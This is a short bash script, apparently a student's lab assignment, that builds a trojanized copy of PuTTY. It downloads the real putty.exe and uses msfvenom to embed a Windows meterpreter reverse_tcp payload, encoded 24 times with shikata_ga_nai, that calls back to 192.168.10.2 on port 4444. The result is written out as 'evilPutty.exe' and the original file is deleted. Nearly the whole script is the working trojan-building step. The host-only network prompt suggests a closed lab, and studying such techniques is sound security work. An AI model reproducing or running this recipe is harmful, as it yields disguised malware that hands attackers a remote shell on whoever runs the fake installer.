#!/bin/bash
#  John Williams
#  105201054
#  Date: Fri. Oct. 12, 2018
#  Program: setup.sh


red=`tput setaf 1`
green=`tput setaf 2`
reset=`tput sgr0`

echo "${green}[*]Change ip address to Dynamic IP${reset}"

rm -f evilPutty.exe
./change_ip.sh -r

echo "${green}[*]Download putty.exe fromhttp://the.earth.li ${reset}"
wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe

#./change_ip.sh 192.168.10.2

echo "${green}[*]Inject file with Trojan ${reset}"
msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 24 -k -x ./putty.exe LHOST=192.168.10.2 LPORT=4444 > evilPutty.exe

echo "${green}[*]Remove original putty file ${reset}"
rm -f putty.exe


echo

echo "${red}Please move machine to host only here:"
read -n1 -r -p "Press space to continue...${reset}" key




